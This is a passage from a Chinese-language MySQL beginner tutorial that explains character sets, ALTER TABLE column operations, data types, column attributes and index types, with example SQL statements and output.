分别转换为退格、制表、换行和回车字符。它们并没有特定的图形显示，但会依不同的应用程序，而对文本显示有不同的影响。<br>32～126(共95个)是字符(32是空格），其中48～57为0到9十个阿拉伯数字。<br>65～90为26个大写英文字母，97～122号为26个小写英文字母，其余为一些标点符号、运算符号等。</p><p><font color="#00B2EE"><strong>GBK</strong></font><br>GBK 向下与 GB 2312 编码兼容。是中华人民共和国定义的汉字计算机编码规范。早期版本为GB2312。</p><p><font color="#00B2EE"><strong>Unicode</strong></font><br>Unicode（统一码、万国码、单一码）Unicode是国际组织制定的可以容纳世界上所有文字和符号的字符编码方案。以满足跨语言、跨平台进行文本转换、处理的要求。</p><p><font color="#00B2EE"><strong>UTF-8</strong></font><br>是一种针对Unicode的可变长度字符编码，也是万国码。因为UNICODE比ASCII占用大一倍的空间，而对ASCII来说高字节的0对他毫无用处。为了解决这个问题，就出现了一些中间格式的字符集，他们被称为通用转换格式，即UTF（Universal Transformation Format）</p><p>&emsp;<br><font color="red" face="Comic sans MS"><strong>(3) 实际工作中要使用的编码</strong></font><br><font color="#FF7F00"><strong>在中文中常用的字符集分为utf-8和GBK。</strong></font><br>实际使用的如下：<br><font color="#FF7F00"></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">字符集</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">gbk_chinese_ci</td><td align="left">简体中文, 不区分大小写</td></tr><tr><td align="center">utf8_general_ci</td><td align="left">Unicode (多语言), 不区分大小写</td></tr></tbody></table></div></div><blockquote><p><font color="#FF7F00"><strong>MySQL字符集由三个部份组成：</strong></font></p><ol><li>字符集 </li><li>语言</li><li>类型<br><font color="#FF7F00"><strong>注意：</strong></font></li><li>最后的bin是指二进制字符集，后面的ci是指存储排序时不区分字符的大小写。</li><li><font color="#FF7F00"><strong>mysql在写utf-8的时候写的是utf8。不加中间的中横线。</strong></font></li></ol></blockquote><p>&emsp;<br>&emsp;</p><h3 id="六-数据字段-列-操作"><font color="#FF6347" face="Comic sans MS">六. 数据字段(列)操作</font><a href="post/MySQL-Primer#六-数据字段-列-操作"></a></h3><h4 id="6-1-修改表字段类型-modify"><font color="#3CB371" face="Comic sans MS">6.1 修改表字段类型 modify</font><a href="post/MySQL-Primer#6-1-修改表字段类型-modify"></a></h4><p>基本语法：<font color="#00B2EE"><strong>alter table 表名 modify 字段名 varchar(20);</strong></font><br>关键字：<strong>alter、modify</strong></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">alter table 表名 modify 字段名 varchar(20);</td></tr><tr><td align="center">示例</td><td align="left">alter table user modify username varchar(20);</td></tr><tr><td align="center">示例说明</td><td align="left">将user表的username的类型改为varchar(20)</td></tr></tbody></table></div></div><p>&emsp;</p><h4 id="6-2-增加表字段"><font color="#3CB371" face="Comic sans MS">6.2 增加表字段</font><a href="post/MySQL-Primer#6-2-增加表字段"></a></h4><p>基本语法：<font color="#00B2EE"><strong>alter table 表名 add column 字段名 类型;</strong></font><br>关键字：<strong>alter、add column</strong></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">alter table 表名 add column 字段名 类型;</td></tr><tr><td align="center">示例</td><td align="left">alter table user add column age int(3);</td></tr><tr><td align="center">示例说明</td><td align="left">添加一个字段为age，类型为整型长度为3</td></tr></tbody></table></div></div><p>&emsp;</p><h4 id="6-3-增加字段时控制字段顺序"><font color="#3CB371" face="Comic sans MS">6.3 增加字段时控制字段顺序</font><a href="post/MySQL-Primer#6-3-增加字段时控制字段顺序"></a></h4><p>基本语法：<font color="#00B2EE"><strong>alter table 表名 add 字段名 字段类型 after 字段名;</strong></font><br>关键字：<strong>alter、add、after</strong></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">ALTER TABLE 表名 ADD 字段名 字段类型 AFTER 字段名;</td></tr><tr><td align="center">示例</td><td align="left">ALTER TABLE user ADD email VARCHAR(60) AFTER createip;<br>ALTER TABLE user ADD id INT(10) FIRST;</td></tr><tr><td align="center">示例说明</td><td align="left">user表中，在createip后增加一个字段为email，类型为varchar，长度为60<br>ser表中在最开始的位置增加一个字段为id,类型为int，长度为10</td></tr></tbody></table></div></div><p>&emsp;</p><h4 id="6-4-删除表字段"><font color="#3CB371" face="Comic sans MS">6.4 删除表字段</font><a href="post/MySQL-Primer#6-4-删除表字段"></a></h4><p>基本语法：<font color="#00B2EE"><strong>alter table 表名 drop column 字段名;</strong></font><br>关键字：<strong>alter、drop column</strong></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">alter table 表名 drop column 字段名;</td></tr><tr><td align="center">示例</td><td align="left">alter table user drop column age;</td></tr><tr><td align="center">示例说明</td><td align="left">在user表中删除字段age</td></tr></tbody></table></div></div><p>&emsp;</p><h4 id="6-5-表字段改名"><font color="#3CB371" face="Comic sans MS">6.5 表字段改名</font><a href="post/MySQL-Primer#6-5-表字段改名"></a></h4><p>基本语法：<font color="#00B2EE"><strong>alter table 表名 change 字段原名 字段新名 字段类型;</strong></font><br>关键字：<strong>alter、change</strong></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">alter table 表名 change 字段原名 字段新名 字段类型;</td></tr><tr><td align="center">示例</td><td align="left">alter table user change email em varchar(60);</td></tr><tr><td align="center">示例说明</td><td align="left">在user表中将字段中的email字段名字为em</td></tr></tbody></table></div></div><p>&emsp;</p><h4 id="6-6-修改表字段排列顺序"><font color="#3CB371" face="Comic sans MS">6.6 修改表字段排列顺序</font><a href="post/MySQL-Primer#6-6-修改表字段排列顺序"></a></h4><p>在前的字段增加和修改语句<font color="#00B2EE"><strong>（add/change/modify）</strong></font>中，最后都可以加一个可选项 <font color="#00B2EE"><strong>first|after</strong></font>。<br>增加表字段时我们已经学过了如何调整顺序。我们现在在来看看另外的change或modify如何来调整顺序。</p><p>我们用first做个小实验。<br>使用modify调整顺序</p><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> alter table user modify em <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span> first<span class="token punctuation">;</span> Query <span class="token constant">OK</span><span class="token punctuation">,</span> <span class="token number">0</span> rows <span class="token function">affected</span> <span class="token punctuation">(</span><span class="token number">0.41</span> sec<span class="token punctuation">)</span> Records<span class="token punctuation">:</span> <span class="token number">0</span>  Duplicates<span class="token punctuation">:</span> <span class="token number">0</span>  Warnings<span class="token punctuation">:</span> <span class="token number">0</span>输出结果<span class="token punctuation">:</span>mysql<span class="token operator">></span> desc user<span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token operator">|</span> Field    <span class="token operator">|</span> Type          <span class="token operator">|</span> <span class="token keyword">Null</span> <span class="token operator">|</span> Key <span class="token operator">|</span> <span class="token keyword">Default</span> <span class="token operator">|</span> Extra <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token operator">|</span> em         <span class="token operator">|</span> <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span>   <span class="token operator">|</span> <span class="token constant">YES</span>  <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token keyword">NULL</span>    <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token operator">|</span> username   <span class="token operator">|</span> <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>   <span class="token operator">|</span> <span class="token constant">YES</span>  <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token keyword">NULL</span>    <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token operator">|</span> password   <span class="token operator">|</span> <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>   <span class="token operator">|</span> <span class="token constant">YES</span>  <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token keyword">NULL</span>    <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token operator">|</span> createtime <span class="token operator">|</span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>       <span class="token operator">|</span> <span class="token constant">YES</span>  <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token keyword">NULL</span>    <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token operator">|</span> createip   <span class="token operator">|</span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>       <span class="token operator">|</span> <span class="token constant">YES</span>  <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token keyword">NULL</span>    <span class="token operator">|</span>     <span class="token operator">|</span> <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span> <span class="token number">5</span> rows in <span class="token function">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;</p><h4 id="6-7-修改表名"><font color="#3CB371" face="Comic sans MS">6.7 修改表名</font><a href="post/MySQL-Primer#6-7-修改表名"></a></h4><p>基本语法：<font color="#00B2EE"><strong>alter table 旧表名 rename 新的表名;</strong></font><br>关键字：<strong>alter、rename</strong></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">alter table 旧表名 rename 新的表名;</td></tr><tr><td align="center">示例</td><td align="left">alter table user rename new_user;</td></tr><tr><td align="center">示例说明</td><td align="left">将user表名改为new_user</td></tr></tbody></table></div></div><p>&emsp;<br>&emsp;</p><h3 id="七-数据类型"><font color="#FF6347" face="Comic sans MS">七. 数据类型</font><a href="post/MySQL-Primer#七-数据类型"></a></h3><p>MySQL中存的是数据。<font color="#FF7F00"><strong>只要是数据，我们就会规定数据的类型。</strong></font>在表的字段中规定了使用的是某个数据类型。那么，在插入的数据中就要使用对应的数据类型。并且，遵守数据类型的长度要求。</p><p>&emsp;</p><blockquote><p><font color="#00B2EE"><strong>在MySQL里面我们将数据类型分为了以下一些类型：</strong></font></p><ol><li><strong>数值类型（整型、浮点）</strong></li><li><strong>字符串类型</strong></li><li><strong>日期时间类型</strong></li><li><strong>复合类型</strong></li><li><strong>空间类型（非科学性工作基本不用，不做讲解）</strong></li></ol></blockquote><p>&emsp;<br><font color="red"><strong>1. 整型</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">数据类型</th><th align="left">所占字节</th><th align="left">值范围</th></tr></thead><tbody><tr><td align="center">tinyint</td><td align="left">1字节</td><td align="left">-128~127</td></tr><tr><td align="center">smallint</td><td align="left">2字节</td><td align="left">-32768~32767</td></tr><tr><td align="center">mediumin</td><td align="left">3字节</td><td align="left">-8388608~8388607</td></tr><tr><td align="center">int</td><td align="left">4字节</td><td align="left">-2147483648~2147483647</td></tr><tr><td align="center">bigint</td><td align="left">8字节</td><td align="left">+-9.22*10的18次方</td></tr></tbody></table></div></div><blockquote><p><font color="#FF7F00"><strong>注意：</strong></font></p><ol><li>MySQL 以一个可选的显示宽度指示器的形式对 SQL 标准进行扩展，这样当从数据库检索一个值时，可以把这个值加长到指定的长度。例如，指定一个字段的类型为 INT(6)，就可以保证所包含数字<font color="#FF7F00"><strong>少于 6 个的值从数据库中检索出来时能够自动地用空格填充</strong></font>。需要注意的是，使用一个宽度指示器不会影响字段的大小和它可以存储的值的范围。</li><li>在创建表字段时，性别我们可以使用无符号的微小整型（tinyint）来表示。<font color="#FF7F00"><strong>用0表示女、用1表示男。用2表示未知</strong></font>。</li><li>同样人类年龄也是，在创建表字段时可用用无符号的整型。因为人类的年龄还没有负数</li><li>在实际使用过程中。我们业务中最大需要存储多大的数值。我们创建表时，就选择什么样的类型来存储这样的值。</li></ol></blockquote><p>&emsp;<br><font color="red"><strong>2. 浮点类型</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">数据类型</th><th align="left">所占字节</th><th align="left">值范围</th></tr></thead><tbody><tr><td align="center">float(m, d)</td><td align="left">4字节</td><td align="left">单精度浮点型，m总个数，d小数位</td></tr><tr><td align="center">double(m, d)</td><td align="left">8字节</td><td align="left">双精度浮点型，m总个数，d小数位</td></tr><tr><td align="center">decimal(m, d)</td><td align="left"></td><td align="left">decimal是存储为字符串的浮点数</td></tr></tbody></table></div></div><blockquote><p><font color="#FF7F00"><strong>注意：</strong></font></p><ol><li>浮点是非精确值，会存在不太准确的情况</li><li>而decimal叫做定点数。在MySQL内部，本质上是用字符串存储的。实际使用过程中如果存在金额、钱精度要求比较高的浮点数存储，建议使用decimal（定点数）这个类型。</li></ol></blockquote><p>&emsp;<br><font color="red"><strong>3. 字符类型</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">数据类型</th><th align="left">所占字节</th><th align="left">值范围</th></tr></thead><tbody><tr><td align="center">CHAR</td><td align="left">0-255字节</td><td align="left">定长字符串</td></tr><tr><td align="center">VARCHAR</td><td align="left">0-255字节</td><td align="left">变长字符串</td></tr><tr><td align="center">TINYBLOB</td><td align="left">0-255字节</td><td align="left">不超过255个字符的二进制字符串</td></tr><tr><td align="center">TINYTEXT</td><td align="left">0-255字节</td><td align="left">短文本字符串</td></tr><tr><td align="center">BLOB</td><td align="left">0-65535字节</td><td align="left">二进制形式的长文本数据</td></tr><tr><td align="center">TEXT</td><td align="left">0-65535字节</td><td align="left">长文本数据</td></tr><tr><td align="center">MEDIUMBLOB</td><td align="left">0-16 777 215字节</td><td align="left">二进制形式的中等长度文本数据</td></tr><tr><td align="center">MEDIUMTEXT</td><td align="left">0-16 777 215字节</td><td align="left">中等长度文本数据</td></tr><tr><td align="center">LOGNGBLOB</td><td align="left">0-4 294 967 295字节</td><td align="left">二进制形式的极大文本数据</td></tr><tr><td align="center">LONGTEXT</td><td align="left">0-4 294 967 295字节</td><td align="left">极大文本数据</td></tr><tr><td align="center">VARBINARY(M)</td><td align="left">允许长度0-M个字节的定长字节符串</td><td align="left">值的长度+1个字节</td></tr><tr><td align="center">BINARY(M)</td><td align="left">M</td><td align="left">允许长度0-M个字节的定长字节符串</td></tr></tbody></table></div></div><blockquote><p><font color="#FF7F00"><strong>注意：</strong></font></p><ol><li>CHAR 类型用于定长字符串，并且必须在圆括号内用一个大小修饰符来定义。这个大小修饰符的范围从0-255。比指定长度大的值将被截短，而比指定长度小的值将会用空格作填补。</li><li>VARCHAR  把这个大小视为值的大小，不长度不足的情况下就用空格补足。而 VARCHAR 类型把它视为最大值并且只使用存储字符串实际需要的长度<br>类型不会被空格填补，但长于指示器的值仍然会被截短。<br>因为VARCHAR类型可以根据实际内容动态改变存储值的长度，所以在不能确定字段需要多少字符时使用 VARCHAR 类型可以大大地节约磁盘空间、提高存储效率。</li><li>text类型与blob类型对于字段长度要求超过 255 个的情况下，MySQL 提供了 TEXT 和 BLOB 两种类型。根据存储数据的大小，它们都有不同的子类型。这些大型的数据用于存储文本块或图像、声音文件等二进制数据类型。</li><li>TEXT 和 BLOB 类型在分类和比较上存在区别。BLOB 类型区分大小写，而 TEXT 不区分大小写。大小修饰符不用于各种 BLOB 和 TEXT 子类型。</li></ol></blockquote><p>&emsp;<br><font color="red"><strong>4. 时间类型</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">数据类型</th><th align="left">所占字节</th><th align="left">值范围</th></tr></thead><tbody><tr><td align="center">date</td><td align="left">3字节</td><td align="left">日期，格式：2014-09-18</td></tr><tr><td align="center">time</td><td align="left">3字节</td><td align="left">时间，格式：08:42:30</td></tr><tr><td align="center">datetime</td><td align="left">8字节</td><td align="left">日期时间，格式：2014-09-18 08:42:30</td></tr><tr><td align="center">timestamp</td><td align="left">4字节</td><td align="left">自动存储记录修改的时间</td></tr><tr><td align="center">year</td><td align="left">1字节</td><td align="left">年份</td></tr></tbody></table></div></div><blockquote><p><font color="#FF7F00"><strong>注意：</strong></font></p><ol><li>时间类型在web系统中用的比较少，很多时候很多人喜欢使用int来存储时间。插入时插入的是unix时间戳，因为这种方式更方便计算。在前端业务中用date类型的函数，再将unix时间戳转成人们可识别的时间。</li><li>有些人为了在数据库管理中方便查看，也有人使用datetime类型来存储时间。</li></ol></blockquote><p>&emsp;<br><font color="red"><strong>5. 复合类型</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">数据类型</th><th align="left">说明</th><th align="left">举例</th></tr></thead><tbody><tr><td align="center">set</td><td align="left">集合类型</td><td align="left">set(“member”, “member2″, … “member64″)</td></tr><tr><td align="center">enum</td><td align="left">枚举类型</td><td align="left">enum(“member1″, “member2″, … “member65535″)</td></tr></tbody></table></div></div><blockquote><p><font color="#FF7F00"><strong>注意：</strong></font><br><strong>一个 ENUM 类型只允许从一个集合中取得一个值；而 SET 类型允许从一个集合中取得任意多个值。</strong></p></blockquote><p>&emsp;<br><font color="#00B2EE"><strong>ENUM 类型</strong></font></p><ol><li>ENUM 类型因为只允许在集合中取得一个值，有点类似于单选项。在处理相互排拆的数据时容易让人理解，比如人类的性别。ENUM 类型字段可以从集合中取得一个值或使用null值，除此之外的输入将会使 MySQL 在这个字段中插入一个空字符串。另外如果插入值的大小写与集合中值的大小写不匹配，MySQL会自动使用插入值的大小写转换成与集合中大小写一致的值。</li><li>ENUM 类型在系统内部可以存储为数字，并且从1开始用数字做索引。一个 ENUM 类型最多可以包含 65536 个元素，其中一个元素被 MySQL 保留，用来存储错误信息，这个错误值用索引 0 或者一个空字符串表示。</li><li>MySQL 认为 ENUM 类型集合中出现的值是合法输入，除此之外其它任何输入都将失败。这说明通过搜索包含空字符串或对应数字索引为 0 的行就可以很容易地找到错误记录的位置。</li></ol><p><font color="#00B2EE"><strong>SET 类型</strong></font></p><ol><li>SET 类型SET 类型与 ENUM 类型相似但不相同。SET类型可以从预定义的集合中取得任意数量的值。并且与 ENUM 类型相同的是任何试图在 SET 类型字段中插入非预定义的值都会使MySQL插入一个空字符串。如果插入一个即有合法的元素又有非法的元素的记录，MySQL 将会保留合法的元素，除去非法的元素。</li><li>一个 SET 类型最多可以包含 64 项元素。在 SET 元素中值被存储为一个分离的“位”序列，这些“位”表示与它相对应的元素。“位”是创建有序元素集合的一种简单而有效的方式。<br>并且它还去除了重复的元素，所以SET类型中不可能包含两个相同的元素。<br>希望从 SET 类型字段中找出非法的记录只需查找包含空字符串或二进制值为 0 的行。</li></ol><p>&emsp;<br><font color="red"><strong>6. 类型使用</strong></font><br>我们学习了这么多类型，在创建表的语句的时候使用对应的类型即可。</p><p>举例如下：<br><font color="red"></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token keyword">IF</span> <span class="token constant">NOT</span> <span class="token constant">EXISTS</span> <span class="token function">demo</span> <span class="token punctuation">(</span>   id <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>   username <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>   password <span class="token function">char</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>   content longtext <span class="token constant">NOT</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>   createtime datetime <span class="token constant">NOT</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span>   sex <span class="token function">tinyint</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token keyword">NULL</span> <span class="token punctuation">)</span> <span class="token constant">ENGINE</span><span class="token operator">=</span>InnoDB <span class="token keyword">DEFAULT</span> <span class="token constant">CHARSET</span><span class="token operator">=</span>utf8<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font color="red"><strong>7. 字段(列)其他属性设置</strong></font><br><font color="#00B2EE"><strong>(1) UNSIGNED（无符号）</strong></font><br>主要用于整型和浮点类型，使用无符号。即，没有前面面的-（负号）。<br>存储位数更长。tinyint整型的取值区间为，-128-127。而使用无符号后可存储0-255个长度。<br>创建时在整型或浮点字段语句后接上：<br>unsigned</p><p><font color="#00B2EE"><strong>(2) ZEROFILL（0填充）</strong></font><br>0（不是空格）可以用来真补输出的值。使用这个修饰符可以阻止 MySQL 数据库存储负值。<br>创建时在整型或浮点字段语句后接上：zerofill</p><p><font color="#00B2EE"><strong>(3) default</strong></font><br>default属性确保在没有任何值可用的情况下，赋予某个常量值，这个值必须是常量，因为MySQL不允许插入函数或表达式值。此外，此属性无法用于BLOB或TEXT列。如果已经为此列指定了NULL属性，没有指定默认值时默认值将为NULL，否则默认值将依赖于字段的数据类型。<br>创建时在整型或浮点字段语句后接上：default ‘值’</p><p><font color="#00B2EE"><strong>(4) not null</strong></font><br>如果将一个列定义为not null，将不允许向该列插入null值。建议在重要情况下始终使用not null属性，因为它提供了一个基本验证，确保已经向查询传递了所有必要的值。<br><font color="#FF7F00"><strong>创建时在整型或浮点字段语句后接上：not null</strong></font></p><p><font color="#00B2EE"><strong>(5) null</strong></font><br>为列指定null属性时，该列可以保持为空，而不论行中其它列是否已经被填充。记住，null精确的说法是“无”，而不是空字符串或0。<br>创建时在整型或浮点字段语句后不要声明not null即可。</p><p>&emsp;<br>&emsp;<br><font color="red"></font></p><h3 id="八-索引"><font color="#FF6347" face="Comic sans MS">八. 索引</font><a href="post/MySQL-Primer#八-索引"></a></h3><p>索引看着挺高大上的一个名字，说白了就是我们书最新面的目录。 (ง •_•)ง<br>索引用于快速找出在某个列中有一特定值的行。<br>不使用索引，MySQL必须从第1条记录开始然后读完整个表直到找出相关的行。表越大，花费的时间越多。如果表中查询的列有一个索引，MySQL能快速到达一个位置去搜寻到数据文件的中间，没有必要看所有数据。<br>当然索引也不易过多，索引越多写入，修改的速度越慢。因为，写入修改数据时，也要修改索引。<br><font color="red"></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">索引类型</th><th align="left">功能说明</th></tr></thead><tbody><tr><td align="center">普通索引</td><td align="left">最基本的索引，它没有任何限制</td></tr><tr><td align="center">唯一索引</td><td align="left">某一行企用了唯一索引则不准许这一列的行数据中有重复的值。针对这一列的每一行数据都要求<br>是唯一的</td></tr><tr><td align="center">主键索引</td><td align="left">它是一种特殊的唯一索引，不允许有空值。一般是在建表的时候同时创建主键索引，常用于用户<br>ID。类似于书中的页码</td></tr><tr><td align="center">全文索引</td><td align="left">对于需要全局搜索的数据，进行全文索引</td></tr></tbody></table></div></div><p>&emsp;<br><font color="red"><strong>1. 普通索引</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类型</th><th align="left">详细说明</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">alter table 表  add index(字段)</td></tr><tr><td align="center">示例</td><td align="left">ALTER TABLE money ADD INDEX(username);</td></tr><tr><td align="center">示例解释</td><td align="left">为money表的username字段增加索引</td></tr></tbody></table></div></div><p>&emsp;<br><font color="red"><strong>2. 唯一索引</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类型</th><th align="left">详细说明</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">alter table 表  add UNIQUE(字段)</td></tr><tr><td align="center">示例</td><td align="left">ALTER TABLE money ADD UNIQUE(email);</td></tr><tr><td align="center">示例解释</td><td align="left">为money表的email字段增加唯一索引</td></tr></tbody></table></div></div><p>&emsp;<br><font color="red"><strong>3. 全文索引</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类型</th><th align="left">详细说明</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">alter table 表  add FULLTEXT(字段)</td></tr><tr><td align="center">示例</td><td align="left">ALTER TABLE money ADD FULLTEXT(content);</td></tr><tr><td align="center">示例解释</td><td align="left">为money表的content字段增加唯一索引</td></tr></tbody></table></div></div><p>&emsp;<br><font color="red"><strong>4. 主键索引</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类型</th><th align="left">详细说明</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">alter table 表  add PRIMARY KEY(字段)</td></tr><tr><td align="center">示例</td><td align="left">ALTER TABLE money ADD PRIMARY KEY(id);</td></tr><tr><td align="center">示例解释</td><td align="left">为money表的id字段增加主键索引</td></tr></tbody></table></div></div><p>&emsp;<br><font color="#00B2EE"><strong>5. 创建表时也可以声明索引</strong></font><br>创建表时可在创建表语句后加上对应的类型即可声明索引：</p><p><font color="red"></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token constant">PRIMARY</span> <span class="token function">KEY</span><span class="token punctuation">(</span>字段<span class="token punctuation">)</span>  <span class="token constant">INDEX</span> <span class="token punctuation">[</span>索引名<span class="token punctuation">]</span> <span class="token punctuation">(</span>字段<span class="token punctuation">)</span> <span class="token constant">FULLTEXT</span> <span class="token punctuation">[</span>索引名<span class="token punctuation">]</span> <span class="token punctuation">(</span>字段<span class="token punctuation">)</span> <span class="token constant">UNIQUE</span><span class="token punctuation">[</span>索引名<span class="token punctuation">]</span> <span class="token punctuation">(</span>字段<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注：中括号中的索引名，代表可选。</strong></p><p>&emsp;<br>整体示例如下：</p><p><font color="red"></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token function">test</span> <span class="token punctuation">(</span>     id <span class="token constant">INT</span> <span class="token constant">NOT</span> <span class="token keyword">NULL</span> <span class="token punctuation">,</span>      username <span class="token function">VARCHAR</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token keyword">NULL</span> <span class="token punctuation">,</span>      password <span class="token constant">INT</span> <span class="token constant">NOT</span> <span class="token keyword">NULL</span> <span class="token punctuation">,</span>      content <span class="token constant">INT</span> <span class="token constant">NOT</span> <span class="token keyword">NULL</span> <span class="token punctuation">,</span>      <span class="token constant">PRIMARY</span> <span class="token function">KEY</span> <span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token constant">INDEX</span> <span class="token function">pw</span> <span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token function">UNIQUE</span> <span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">,</span>     <span class="token function">FULLTEXT</span> <span class="token punctuation">(</span>content<span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token constant">ENGINE</span> <span class="token operator">=</span> InnoDB<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h3 id="九-多表联合查询"><font color="#FF6347" face="Comic sans MS">九. 